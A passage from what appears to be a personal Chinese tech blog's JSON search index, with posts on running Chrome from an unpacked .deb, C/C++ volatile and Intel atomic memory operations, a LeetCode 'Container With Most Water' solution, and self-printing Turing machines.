的deb解压获得chrome从而不需要安装也可以使用chrome</h3><ul>\n<li><code>dpkg -x xxx.deb folder</code>即可把deb包解压到folder文件夹中</li>\n<li>然后使用使用<code>chown</code>命令修改<code>folder/opt/google/chrome/chrome-sandbox</code>的拥有者为root，然后使用<code>chmod 4755</code>修改该文件的权限，才可以使用这个chrome</li>\n<li>使用方法，直接在<code>folder/opt/google/chrome/</code>目录下运行<code>./chrome</code>即可</li>\n</ul>\n","slug":"How-to-Have-Two-Chromes-at-Linux","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/tags/运维/"},{"name":"小技巧","slug":"小技巧","permalink":"https://h-zex.github.io/tags/小技巧/"},{"name":"chrome","slug":"chrome","permalink":"https://h-zex.github.io/tags/chrome/"},{"name":"linux","slug":"linux","permalink":"https://h-zex.github.io/tags/linux/"}]},{"title":"关于volatile、单条指令的原子性","date":"2018-09-09T10:08:21.000Z","path":"2018/09/09/关于volatile、单条指令的原子性/","text":"volatile 以下说的是C/C++的volatile CSAPP的信号handler中说，对于shared变量，要用volatile修饰，即使是全局变量也如此。 虽然我使用clang 3.8试验，在几种常见情况下，全局变量都不会被缓存在寄存器，但是还是有必要这样做。 至于内存重排序，比如 1234567// thread 1Object c = init();bool isReady = true// thread 2while(isReady==false);// use Object c 因为内存重排序，所以可能使用 Object c时还没有被初始化 Intel 的Software Developer’s Manual，有Memory Ordering的介绍 C++、Java等还有自己的memory model 在非本地跳转中，volatile用的比较多。因为非本地跳转会加载存储在env中的环境（包括寄存器的值） 单条汇编的原子性 CSAPP的内嵌汇编的web aside中 To specify that an instruction should be) executed atomically, a special lock prefix byte (with code 0xF0) is included in the machine code immediately before the instruction. This is written in assembly by writing lock as if it were an instruction on a separate line before the instruction that is to be executed atomically. Intel对于连接在同一个system bus上的多处理器的管理机制 注意，以下都是基于Intel® 64 and IA-32 Architectures Software Developer’s Manual (2018 5 18), Vol.3A ch8 The Intel 64 and IA-32 architectures provide mechanisms for managing and improving the performance of multiple processors connected to the same system bus. 这些机制的特性 保证内存一致性 To maintain system memory coherency. When two or more processors are attempting simultaneously to access the same address in system memory, some communication mechanism or memory access protocol must be available to promote data coherency and, in some instances, to allow one processor to temporarily lock a memory location. 保证cache的一致性。比如一个shared变量被缓存在不同processor的L1 cache，那么其中一个processor修改了这个变量，其他processor要如何感知。具体可以看MESI Protocol To maintain cache consistency — When one processor accesses data cached on another processor, it must not receive incorrect data. If it modifies data, all other processors that access that data must receive the modified data. 可预测的内存写顺序 To allow predictable ordering of writes to memory. In some circumstances, it is important that memory writes be observed externally in precisely the same order as programmed. 分派中断处理 To distribute interrupt handling among a group of processors — When several processors are operating in a system in parallel, it is useful to have a centralized mechanism for receiving interrupts and distributing them to available processors for servicing. To increase system performance by exploiting the multi-threaded and multi-process nature of contemporary operating systems and applications. Guaranteed Atomic Operations atomically的含义 That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location. Intel还支持通过bus locking来实现对shared area of memory的操作，不过这个不是默认行为。 如果是对于cache中的内存操作，不适用bus lock，而是用processor’s cache coherency protocols来保证原子操作时，其他对于这内存位置的cache被正确管理 The Intel486 processor (and newer processors since) guarantees that the following basic memory operations will always be carried out atomically: Reading or writing a byte Reading or writing a word aligned on a 16-bit boundary Reading or writing a doubleword aligned on a 32-bit boundary The Pentium processor (and newer processors since) guarantees that the following additional memory operations will always be carried out atomically: Reading or writing a quadword aligned on a 64-bit boundary 16-bit accesses to uncached memory locations that fit within a 32-bit data bus The P6 family processors (and newer processors since) guarantee that the following additional memory operation will always be carried out atomically: Unaligned 16-, 32-, and 64-bit accesses to cached memory that fit within a cache line 以上三个保证我也不太清楚memory operations是不是不包括对cache的operations，比如说，某变量缓存在某处理器的L1 cache中，然后对其进行读写，每个读写操作是否对于其他processor来说也是原子的 Accesses to cacheable memory that are split across cache lines and page boundaries are not guaranteed to be atomic by the Intel Core 2 Duo, Intel® Atom™, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, P6 family, Pentium, and Intel486 processors. The Intel Core 2 Duo, Intel Atom, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, and P6 family processors provide bus control signals that permit external memory subsystems to make split accesses atomic; (however, nonaligned data accesses will seriously impact the performance of the processor and should be avoided.) An x87 instruction or an SSE instructions that accesses data larger than a quadword may be implemented using multiple memory accesses. If such an instruction stores to memory, some of the accesses may complete (writing to memory) while another causes the operation to fault for architectural reasons (e.g. due an page-table entry that is marked “not present”). In this case, the effects of the completed accesses may be visible to software even though the overall instruction caused a fault. If TLB invalidation has been delayed (see Section 4.10.4.4), such page faults may occur even if all accesses are to the same page. ….(原文还有多个section，讲述bus 的lock等内容)","raw":"---\ntitle: 关于volatile、单条指令的原子性\ndate: 2018-09-09 18:08:21\ntags:\n- Intel\n- volatile\n- 原子性\ncategories:\n- OS\n- Computer architecture\n---\n\n## volatile\n\n- 以下说的是C/C++的volatile\n- CSAPP的信号handler中说，对于shared变量，要用volatile修饰，即使是全局变量也如此。\n- 虽然我使用clang 3.8试验，在几种常见情况下，全局变量都不会被缓存在寄存器，但是还是有必要这样做。\n- 至于内存重排序，比如\n   ```c\n   // thread 1\n   Object c = init();\n   bool isReady = true\n\n   // thread 2\n   while(isReady==false);\n   // use Object c \n   ```\n   因为内存重排序，所以可能使用 Object c时还没有被初始化\n   Intel 的Software Developer’s Manual，有`Memory Ordering`的介绍\n   C++、Java等还有自己的memory model\n- 在非本地跳转中，volatile用的比较多。因为非本地跳转会加载存储在env中的环境（包括寄存器的值）\n\n## 单条汇编的原子性\n\n- CSAPP的内嵌汇编的web aside中\n   > To specify that an instruction should be) executed atomically, a special lock prefix byte (with code 0xF0) is included in the machine code immediately before the instruction. This is written in assembly by writing lock as if it were an instruction on a separate line before the instruction that is to be executed atomically.\n\n## Intel对于**连接在同一个system bus上**的多处理器的管理机制\n\n> - 注意，以下都是基于*Intel® 64 and IA-32 Architectures Software Developer’s Manual* (2018 5 18), Vol.3A ch8\n> - The Intel 64 and IA-32 architectures provide mechanisms for managing and improving the performance of multiple processors connected to the same system bus. \n\n### 这些机制的特性\n\n- 保证内存一致性\n   > To maintain system memory coherency. When two or more processors are attempting simultaneously to access the same address in system memory, some communication mechanism or memory access protocol must be available to promote data coherency and, in some instances, to allow one processor to temporarily lock a memory location.\n- 保证cache的一致性。比如一个shared变量被缓存在不同processor的L1 cache，那么其中一个processor修改了这个变量，其他processor要如何感知。具体可以看[MESI Protocol](https://en.wikipedia.org/wiki/MESI_protocol)\n   > To maintain cache consistency — When one processor accesses data cached on another processor, it must not receive incorrect data. If it modifies data, all other processors that access that data must receive the modified data.\n- 可预测的内存写顺序\n   > To allow predictable ordering of writes to memory. In some circumstances, it is important that memory writes be observed externally in precisely the same order as programmed. \n- 分派中断处理\n   >  To distribute interrupt handling among a group of processors — When several processors are operating in a system in parallel, it is useful to have a centralized mechanism for receiving interrupts and distributing them to available processors for servicing.\n- > To increase system performance by exploiting the multi-threaded and multi-process nature of contemporary operating systems and applications.\n\n### Guaranteed Atomic Operations\n\n- `atomically`的含义\n  > That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location.\n- Intel还支持通过bus locking来实现对shared area of memory的操作，不过这个不是默认行为。\n- 如果是对于cache中的内存操作，不适用bus lock，而是用processor's cache coherency protocols来保证原子操作时，其他对于这内存位置的cache被正确管理\n- The Intel486 processor (and newer processors since) guarantees that the following basic **memory operations** will always be carried out atomically:\n   - Reading or writing a byte\n   - Reading or writing a word aligned on a 16-bit boundary\n   - Reading or writing a doubleword aligned on a 32-bit boundary\n- The Pentium processor (and newer processors since) guarantees that the following additional **memory operations** will always be carried out atomically:\n   - Reading or writing a quadword aligned on a 64-bit boundary\n   - 16-bit accesses to uncached memory locations that fit within a 32-bit data bus\n- The P6 family processors (and newer processors since) guarantee that the following additional memory operation will always be carried out atomically:\n   - Unaligned 16-, 32-, and 64-bit accesses to cached memory that fit within a cache line\n- 以上三个保证我也不太清楚**memory operations**是不是不包括对cache的operations，比如说，某变量缓存在某处理器的L1 cache中，然后对其进行读写，每个读写操作是否对于其他processor来说也是原子的\n- Accesses to cacheable memory that are split across cache lines and page boundaries are not guaranteed to be atomic by the Intel Core 2 Duo, Intel® Atom™, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, P6 family, Pentium, and Intel486 processors.\n- The Intel Core 2 Duo, Intel Atom, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, and P6 family processors provide bus control signals that permit external memory subsystems to make split accesses atomic; (however, nonaligned data accesses will seriously impact the performance of the processor and should be avoided.)\n- An x87 instruction or an SSE instructions that accesses data larger than a quadword may be implemented using multiple memory accesses. If such an instruction stores to memory, some of the accesses may complete (writing to memory) while another causes the operation to fault for architectural reasons (e.g. due an page-table entry that is marked “not present”). In this case, the effects of the completed accesses may be visible to software even though the overall instruction caused a fault. If TLB invalidation has been delayed (see Section 4.10.4.4), such page faults may occur even if all accesses are to the same page.\n\n### ....(原文还有多个section，讲述bus 的lock等内容)\n","content":"<h2 id=\"volatile\"><a href=\"#volatile\" class=\"headerlink\" title=\"volatile\"></a>volatile</h2><ul>\n<li>以下说的是C/C++的volatile</li>\n<li>CSAPP的信号handler中说，对于shared变量，要用volatile修饰，即使是全局变量也如此。</li>\n<li>虽然我使用clang 3.8试验，在几种常见情况下，全局变量都不会被缓存在寄存器，但是还是有必要这样做。</li>\n<li><p>至于内存重排序，比如</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// thread 1</span></span><br><span class=\"line\">Object c = init();</span><br><span class=\"line\"><span class=\"keyword\">bool</span> isReady = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// thread 2</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(isReady==<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">// use Object c</span></span><br></pre></td></tr></table></figure>\n<p> 因为内存重排序，所以可能使用 Object c时还没有被初始化<br> Intel 的Software Developer’s Manual，有<code>Memory Ordering</code>的介绍<br> C++、Java等还有自己的memory model</p>\n</li>\n<li>在非本地跳转中，volatile用的比较多。因为非本地跳转会加载存储在env中的环境（包括寄存器的值）</li>\n</ul>\n<h2 id=\"单条汇编的原子性\"><a href=\"#单条汇编的原子性\" class=\"headerlink\" title=\"单条汇编的原子性\"></a>单条汇编的原子性</h2><ul>\n<li>CSAPP的内嵌汇编的web aside中<blockquote>\n<p>To specify that an instruction should be) executed atomically, a special lock prefix byte (with code 0xF0) is included in the machine code immediately before the instruction. This is written in assembly by writing lock as if it were an instruction on a separate line before the instruction that is to be executed atomically.</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"Intel对于连接在同一个system-bus上的多处理器的管理机制\"><a href=\"#Intel对于连接在同一个system-bus上的多处理器的管理机制\" class=\"headerlink\" title=\"Intel对于连接在同一个system bus上的多处理器的管理机制\"></a>Intel对于<strong>连接在同一个system bus上</strong>的多处理器的管理机制</h2><blockquote>\n<ul>\n<li>注意，以下都是基于<em>Intel® 64 and IA-32 Architectures Software Developer’s Manual</em> (2018 5 18), Vol.3A ch8</li>\n<li>The Intel 64 and IA-32 architectures provide mechanisms for managing and improving the performance of multiple processors connected to the same system bus. </li>\n</ul>\n</blockquote>\n<h3 id=\"这些机制的特性\"><a href=\"#这些机制的特性\" class=\"headerlink\" title=\"这些机制的特性\"></a>这些机制的特性</h3><ul>\n<li>保证内存一致性<blockquote>\n<p>To maintain system memory coherency. When two or more processors are attempting simultaneously to access the same address in system memory, some communication mechanism or memory access protocol must be available to promote data coherency and, in some instances, to allow one processor to temporarily lock a memory location.</p>\n</blockquote>\n</li>\n<li>保证cache的一致性。比如一个shared变量被缓存在不同processor的L1 cache，那么其中一个processor修改了这个变量，其他processor要如何感知。具体可以看<a href=\"https://en.wikipedia.org/wiki/MESI_protocol\" target=\"_blank\" rel=\"noopener\">MESI Protocol</a><blockquote>\n<p>To maintain cache consistency — When one processor accesses data cached on another processor, it must not receive incorrect data. If it modifies data, all other processors that access that data must receive the modified data.</p>\n</blockquote>\n</li>\n<li>可预测的内存写顺序<blockquote>\n<p>To allow predictable ordering of writes to memory. In some circumstances, it is important that memory writes be observed externally in precisely the same order as programmed. </p>\n</blockquote>\n</li>\n<li>分派中断处理<blockquote>\n<p> To distribute interrupt handling among a group of processors — When several processors are operating in a system in parallel, it is useful to have a centralized mechanism for receiving interrupts and distributing them to available processors for servicing.</p>\n</blockquote>\n</li>\n<li><blockquote>\n<p>To increase system performance by exploiting the multi-threaded and multi-process nature of contemporary operating systems and applications.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"Guaranteed-Atomic-Operations\"><a href=\"#Guaranteed-Atomic-Operations\" class=\"headerlink\" title=\"Guaranteed Atomic Operations\"></a>Guaranteed Atomic Operations</h3><ul>\n<li><code>atomically</code>的含义<blockquote>\n<p>That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location.</p>\n</blockquote>\n</li>\n<li>Intel还支持通过bus locking来实现对shared area of memory的操作，不过这个不是默认行为。</li>\n<li>如果是对于cache中的内存操作，不适用bus lock，而是用processor’s cache coherency protocols来保证原子操作时，其他对于这内存位置的cache被正确管理</li>\n<li>The Intel486 processor (and newer processors since) guarantees that the following basic <strong>memory operations</strong> will always be carried out atomically:<ul>\n<li>Reading or writing a byte</li>\n<li>Reading or writing a word aligned on a 16-bit boundary</li>\n<li>Reading or writing a doubleword aligned on a 32-bit boundary</li>\n</ul>\n</li>\n<li>The Pentium processor (and newer processors since) guarantees that the following additional <strong>memory operations</strong> will always be carried out atomically:<ul>\n<li>Reading or writing a quadword aligned on a 64-bit boundary</li>\n<li>16-bit accesses to uncached memory locations that fit within a 32-bit data bus</li>\n</ul>\n</li>\n<li>The P6 family processors (and newer processors since) guarantee that the following additional memory operation will always be carried out atomically:<ul>\n<li>Unaligned 16-, 32-, and 64-bit accesses to cached memory that fit within a cache line</li>\n</ul>\n</li>\n<li>以上三个保证我也不太清楚<strong>memory operations</strong>是不是不包括对cache的operations，比如说，某变量缓存在某处理器的L1 cache中，然后对其进行读写，每个读写操作是否对于其他processor来说也是原子的</li>\n<li>Accesses to cacheable memory that are split across cache lines and page boundaries are not guaranteed to be atomic by the Intel Core 2 Duo, Intel® Atom™, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, P6 family, Pentium, and Intel486 processors.</li>\n<li>The Intel Core 2 Duo, Intel Atom, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, and P6 family processors provide bus control signals that permit external memory subsystems to make split accesses atomic; (however, nonaligned data accesses will seriously impact the performance of the processor and should be avoided.)</li>\n<li>An x87 instruction or an SSE instructions that accesses data larger than a quadword may be implemented using multiple memory accesses. If such an instruction stores to memory, some of the accesses may complete (writing to memory) while another causes the operation to fault for architectural reasons (e.g. due an page-table entry that is marked “not present”). In this case, the effects of the completed accesses may be visible to software even though the overall instruction caused a fault. If TLB invalidation has been delayed (see Section 4.10.4.4), such page faults may occur even if all accesses are to the same page.</li>\n</ul>\n<h3 id=\"…-原文还有多个section，讲述bus-的lock等内容\"><a href=\"#…-原文还有多个section，讲述bus-的lock等内容\" class=\"headerlink\" title=\"….(原文还有多个section，讲述bus 的lock等内容)\"></a>….(原文还有多个section，讲述bus 的lock等内容)</h3>","slug":"关于volatile、单条指令的原子性","categories":[{"name":"OS","slug":"OS","permalink":"https://h-zex.github.io/categories/OS/"},{"name":"Computer architecture","slug":"OS/Computer-architecture","permalink":"https://h-zex.github.io/categories/OS/Computer-architecture/"}],"tags":[{"name":"Intel","slug":"Intel","permalink":"https://h-zex.github.io/tags/Intel/"},{"name":"volatile","slug":"volatile","permalink":"https://h-zex.github.io/tags/volatile/"},{"name":"原子性","slug":"原子性","permalink":"https://h-zex.github.io/tags/原子性/"}]},{"title":"LeetCode 11.Container With Most Water","date":"2018-08-04T04:48:35.594Z","path":"2018/08/04/LeetCode-11-Container-With-Most-Water/","text":"$O(NlgN)$解法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* * 思路： * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置 * 方法是递推 * 首先，map是红黑树实现的，所以其是有序的 * 然后，每次求出第i根柱子后，把 &lt;height[i], &lt;i, result&gt;&gt; push到map里 * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。 * 既然q大于等于p并且在左边，那么p的result应该是q */class Solution &#123; private: typedef pair&lt;int, int&gt; PII; multimap&lt;int, PII, greater&lt;int&gt;&gt; tree; multimap&lt;int, PII, greater&lt;int&gt;&gt; rtree; void ct(const vector&lt;int&gt; &amp;height) &#123; int i = 1; for (auto it = height.begin(); it != height.end(); ++it, ++i) &#123; auto p = tree.insert(pair&lt;int, PII&gt;(*it, PII(i, i))); if (p != tree.begin()) &#123; auto k = (--p)-&gt;second; (++p)-&gt;second = PII(i, k.second); &#125; &#125; &#125; void crt(const vector&lt;int&gt; &amp;height) &#123; int i = height.size(); for (auto it = height.rbegin(); it != height.rend(); ++it, --i) &#123; auto p = rtree.insert(pair&lt;int, PII&gt;(*it, PII(i, i))); if (p != rtree.begin()) &#123; auto k = (--p)-&gt;second; (++p)-&gt;second = PII(i, k.second); &#125; &#125; &#125; public: int maxArea(vector&lt;int&gt; &amp;height) &#123; ct(height); crt(height); int ans = -1; for (auto it = tree.begin(); it != tree.end(); ++it) &#123; int p = (it-&gt;first) * (it-&gt;second.first - it-&gt;second.second); ans = ans &lt; p ? p : ans; &#125; for (auto it = rtree.begin(); it != rtree.end(); ++it) &#123; int p = (it-&gt;first) * (it-&gt;second.second - it-&gt;second.first); ans = ans &lt; p ? p : ans; &#125; return ans; return 0; &#125;&#125;;","raw":"---\ntitle: LeetCode 11.Container With Most Water\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-07-20-21:40:30\ntags:\n- Leetcode\n- ACM\ndescription: solution\ncategories:\n- 算法\n---\n\n## $O(NlgN)$解法\n\n```cpp\n/*\n * 思路：\n * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置\n * 方法是递推\n * 首先，map是红黑树实现的，所以其是有序的\n * 然后，每次求出第i根柱子后，把 <height[i], <i, result>> push到map里\n * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height\n * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result\n * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。\n * 既然q大于等于p并且在左边，那么p的result应该是q\n */\nclass Solution {\n  private:\n    typedef pair<int, int> PII;\n    multimap<int, PII, greater<int>> tree;\n    multimap<int, PII, greater<int>> rtree;\n    void ct(const vector<int> &height) {\n        int i = 1;\n        for (auto it = height.begin(); it != height.end(); ++it, ++i) {\n            auto p = tree.insert(pair<int, PII>(*it, PII(i, i)));\n            if (p != tree.begin()) {\n                auto k = (--p)->second;\n                (++p)->second = PII(i, k.second);\n            }\n        }\n    }\n    void crt(const vector<int> &height) {\n        int i = height.size();\n        for (auto it = height.rbegin(); it != height.rend(); ++it, --i) {\n            auto p = rtree.insert(pair<int, PII>(*it, PII(i, i)));\n            if (p != rtree.begin()) {\n                auto k = (--p)->second;\n                (++p)->second = PII(i, k.second);\n            }\n        }\n    }\n\n  public:\n    int maxArea(vector<int> &height) {\n        ct(height);\n        crt(height);\n        int ans = -1;\n        for (auto it = tree.begin(); it != tree.end(); ++it) {\n            int p = (it->first) * (it->second.first - it->second.second);\n            ans = ans < p ? p : ans;\n        }\n        for (auto it = rtree.begin(); it != rtree.end(); ++it) {\n            int p = (it->first) * (it->second.second - it->second.first);\n            ans = ans < p ? p : ans;\n        }\n        return ans;\n        return 0;\n    }\n};\n```\n","content":"<h2 id=\"O-NlgN-解法\"><a href=\"#O-NlgN-解法\" class=\"headerlink\" title=\"$O(NlgN)$解法\"></a>$O(NlgN)$解法</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * 思路：</span></span><br><span class=\"line\"><span class=\"comment\"> * 对于第i根柱子，求出它左边比他高或者相同高度的柱子中最远的那根的位置</span></span><br><span class=\"line\"><span class=\"comment\"> * 方法是递推</span></span><br><span class=\"line\"><span class=\"comment\"> * 首先，map是红黑树实现的，所以其是有序的</span></span><br><span class=\"line\"><span class=\"comment\"> * 然后，每次求出第i根柱子后，把 &lt;height[i], &lt;i, result&gt;&gt; push到map里</span></span><br><span class=\"line\"><span class=\"comment\"> * 可以从map中取出已经加进map的（也就是在第i根柱子左边的柱子）中，height</span></span><br><span class=\"line\"><span class=\"comment\"> * 刚好大于或者等于height[i]的，设为p，然后，柱子p的result就是柱子i的result</span></span><br><span class=\"line\"><span class=\"comment\"> * 反证法：假设不是，而是q，那么q应当是大于等于p并且在p的左边——否则i的result就还是p，因为p更左边。</span></span><br><span class=\"line\"><span class=\"comment\"> * 既然q大于等于p并且在左边，那么p的result应该是q</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Solution</span> &#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">typedef</span> pair&lt;<span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>&gt; PII;</span><br><span class=\"line\">    <span class=\"built_in\">multimap</span>&lt;<span class=\"keyword\">int</span>, PII, greater&lt;<span class=\"keyword\">int</span>&gt;&gt; tree;</span><br><span class=\"line\">    <span class=\"built_in\">multimap</span>&lt;<span class=\"keyword\">int</span>, PII, greater&lt;<span class=\"keyword\">int</span>&gt;&gt; rtree;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ct</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = height.begin(); it != height.end(); ++it, ++i) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">auto</span> p = tree.insert(pair&lt;<span class=\"keyword\">int</span>, PII&gt;(*it, PII(i, i)));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p != tree.begin()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">auto</span> k = (--p)-&gt;second;</span><br><span class=\"line\">                (++p)-&gt;second = PII(i, k.second);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">crt</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = height.size();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = height.rbegin(); it != height.rend(); ++it, --i) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">auto</span> p = rtree.insert(pair&lt;<span class=\"keyword\">int</span>, PII&gt;(*it, PII(i, i)));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (p != rtree.begin()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">auto</span> k = (--p)-&gt;second;</span><br><span class=\"line\">                (++p)-&gt;second = PII(i, k.second);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">maxArea</span><span class=\"params\">(<span class=\"built_in\">vector</span>&lt;<span class=\"keyword\">int</span>&gt; &amp;height)</span> </span>&#123;</span><br><span class=\"line\">        ct(height);</span><br><span class=\"line\">        crt(height);</span><br><span class=\"line\">        <span class=\"keyword\">int</span> ans = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = tree.begin(); it != tree.end(); ++it) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> p = (it-&gt;first) * (it-&gt;second.first - it-&gt;second.second);</span><br><span class=\"line\">            ans = ans &lt; p ? p : ans;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> it = rtree.begin(); it != rtree.end(); ++it) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> p = (it-&gt;first) * (it-&gt;second.second - it-&gt;second.first);</span><br><span class=\"line\">            ans = ans &lt; p ? p : ans;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n","slug":"LeetCode-11-Container-With-Most-Water","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"https://h-zex.github.io/tags/Leetcode/"},{"name":"ACM","slug":"ACM","permalink":"https://h-zex.github.io/tags/ACM/"}]},{"title":"打印自身的图灵机的构造","date":"2018-08-03T03:16:51.000Z","path":"2018/08/03/打印自身的图灵机的构造/","text":"以下是Introduction to The Theory of Computation 英文第三版的Lemma6.1、Theory6.3的个人理解 下文中，&lt;p&gt; 代表图灵机p的编码 首先，根据Lemma6.1，可以有一台通用机器q，其对于任意w，打印出“输出该w的图灵机”的编码——不过并不保证这台被打印出的图灵机就是那一台生成该w的图灵机——生成w的图灵机可以有很多台，q只打印出其中一台 然后，利用上面这个东西，就可以特殊构造某机器p，其输出w，并且该机器的编码就是q输出的图灵机的编码。从而使得q从p的输出w可以反推出p本身 然后，再特殊一点，这台p输出的w刚好就是q的编码——这是可以做到的，因为q是一台已经确定的，独立于p的图灵机。那么，q的输出+p的输出就刚好是&lt;p&gt;&lt;q&gt; ——从而，q与p组合起来的图灵机就是一台打印出自身的图灵机 继续扩展，p可以有多部分构成，使得p和q组合起来的机器不仅仅打印出自身，还可以做其他事情。比如说，p=ab，其中a是打印出&lt;q&gt;&lt;b&gt; 的图灵机，b是做其他事情的图灵机。然后，图灵机q就可以打印出图灵机p。如果把他们的输出组合起来就成了&lt;p&gt;&lt;q&gt;&lt;b&gt; 。当图灵机a、图灵机q运行完之后，纸带上就有了&lt;p&gt;&lt;q&gt;&lt;b&gt; 。consider that，必然是p先运行，在纸带上留下自己的输出，然后才能q运行，从纸带上获得p的输出，来产生出&lt;p&gt; 。可以修改q，使得其运行后，把控制权交给图灵机b，然后图灵机b从纸带上获得&lt;p&gt;&lt;q&gt;&lt;b&gt; ，继续执行计算。 上文说的转交控制权的可以这样实现——根据图灵机b定制图灵机q，使得q的accept状态后读入空串到达图灵机b的其实状态。这时候，图灵机q的编码将依赖于图灵机b。 更进一步，再修改图灵机q，其不是使用图灵机p的所有输出，而是使用图灵机p的一部分输出来构造出&lt;p&gt; ，那么，图灵机p就不仅仅可以输出图灵机q的描述，还可以在纸带上留下w（w与&lt;p&gt;&lt;q&gt; 无关）。 